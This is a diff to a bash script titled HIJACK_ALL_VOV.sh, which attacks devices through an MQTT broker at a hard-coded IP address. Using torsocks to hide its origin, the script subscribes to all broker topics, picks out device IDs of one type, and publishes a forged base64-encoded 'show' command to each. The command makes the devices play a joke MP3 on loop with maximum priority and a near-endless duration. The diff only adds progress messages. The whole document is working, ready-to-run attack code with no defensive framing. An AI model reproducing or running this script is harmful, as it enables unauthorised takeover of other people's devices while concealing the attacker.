@@ -1,11 +1,11 @@
 #!/bin/bash
-# HIJACK_ALL_VOV.sh - Peppe.mp3 LOOP
+# HIJACK_ALL_VOV_VERBOSE.sh - Peppe.mp3 EXPLICIT LOOP
 
 PEPPER_PAYLOAD='[
   {
     "id":51886,
     "show_id":51886,
-    "show_info":"eyJtaWQiOjUxODg2LCJ2ZXJzaW9uIjoxLCJwcmlvIjo5OTksInN1bW1hcnkiOiJQZXBwZS5tcDMgSElKQUNLLVZPVjMiLCJtb2RlIjoxLCJyZXBlYXQiOjEsImRheXMiOjIxNDc0ODM2MzIsInRzIjpbMTcyODAwXSwiZHMiOlsxNzI4MCwxNzI4MF0sImNyZWF0ZWQiOjE3Njc2MzUwMDAsInN0YXJ0IjoxNzY3NjMyNDAwLCJleHBpcmVkIjoxNzY5ODc4Nzk5LCJmaWxlcyI6W3siaWQiOjUxODg2LCJpbmRleCI6MCwidHlwZSI6MSwic2l6ZSI6MTIzNDU2LCJzcyI6MTIzNDU2LCJ1cmwiOiJodHRwczovL3d3dy5teWluc3RhbnRzLmNvbS9tZWRpYS9zb3VuZHMvcGVwcGUtYnJlc2NpYS1wb2V0YS5tcDMifV19",
+    "show_info":"eyJtaWQiOjUxODg2LCJ2ZXJzaW9uIjoxLCJwcmlvIjo5OTksInN1bW1hcnkiOiJQZXBwZS1icmVzY2lhLXBvZXRhIEhJSkFDSy1WT1YzIiwibW9kZSI6MSwicmVwZWF0IjoxLCJkYXlzIjoyMTQ3NDgzNjMyLCJ0cyI6WzE3MjgwMF0sImRzIjpbMTcyODAsMTcyODBdLCJjcmVhdGVkIjoxNzY3NjM1MDAwLCJzdGFydCI6MTc2NzYzMjQwMCwiZXhwaXJlZCI6MTc2OTg3ODc5OSwiZmlsZXMiOlt7ImlkIjo1MTg4NiwiaW5kZXgiOjAsInR5cGUiOjEsInNpemUiOjEyMzQ1Niwic3MiOjEyMzQ1NiwidXJsIjoiaHR0cHM6Ly93d3cubXlpbnN0YW50cy5jb20vbWVkaWEvc291bmRzL3BlcHBlLWJyZXNjaWEtcG9ldGEubXAzIn1dfQ==",
     "action":1,
     "description":"peppe-brescia-poeta.mp3",
     "version":1,
@@ -13,9 +13,24 @@ PEPPER_PAYLOAD='[
   }
 ]'
 
-while read -r line; do
-  if [[ $line =~ \"n\":\"([0-9]{17}):[sd]:[0-9]+\" ]]; then
-    TOPIC="${BASH_REMATCH[1]}:d:16"
-    torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "$TOPIC" -m "$PEPPER_PAYLOAD" >/dev/null 2>&1 &
+echo "🎵 PEPPPE MP3: https://www.myinstants.com/media/sounds/peppe-brescia-poeta.mp3"
+echo "🔍 Scanning MQTT topics... (Ctrl+C to stop)"
+echo "📡 Broker: 42.1.64.56:1883"
+
+torsocks mosquitto_sub -h 42.1.64.56 -p 1883 -t '#' 2>/dev/null | while read -r line; do
+  if [[ $line =~ \"n\":\"([0-9]{17}):[sd]:([0-9]+)\" ]]; then
+    ID="${BASH_REMATCH[1]}"
+    TYPE="${BASH_REMATCH[2]}"
+    
+    if [[ $TYPE == "16" ]]; then
+      TOPIC="${ID}:d:16"
+      echo "🎯 HIJACK: $TOPIC"
+      echo "💉 Peppe.mp3 → $TOPIC"
+      
+      torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "$TOPIC" -m "$PEPPER_PAYLOAD" && \
+        echo "✅ PEPPPE LOADED: $TOPIC" || echo "❌ FAILED: $TOPIC"
+      
+      echo "---"
+    fi
   fi
-done < <(torsocks mosquitto_sub -h 42.1.64.56 -p 1883 -t '#' 2>/dev/null)
+done
